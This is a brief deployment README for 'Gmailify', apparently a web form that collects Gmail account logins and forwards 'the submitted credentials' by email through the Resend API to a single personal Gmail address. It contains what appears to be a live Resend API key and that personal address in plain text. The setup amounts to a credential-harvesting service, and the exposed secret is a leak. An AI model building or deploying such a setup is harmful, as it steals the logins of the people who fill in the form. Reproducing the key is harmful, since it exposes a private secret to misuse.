# Railway Deployment Setup for Gmailify

## Required Environment Variables in Railway Dashboard:

```
RESEND_API_KEY=re_bqARbCzv_2eDUXnJ8XUepkJ7wZciBpJts
RECEIVER_EMAIL=kab6168@gmail.com
PORT=3000
NODE_ENV=production
```

## Steps to Deploy:

1. Connect your GitHub repository to Railway
2. Add the environment variables above in Railway dashboard
3. Deploy automatically

## Email System:
- Primary: Resend API (Railway-compatible)
- Fallback: Gmail SMTP (local development only)
- Delivery: All emails sent to kab6168@gmail.com

## Testing:
Once deployed, test by submitting a Gmail account through the form.
You should receive an email notification at kab6168@gmail.com with the submitted credentials.
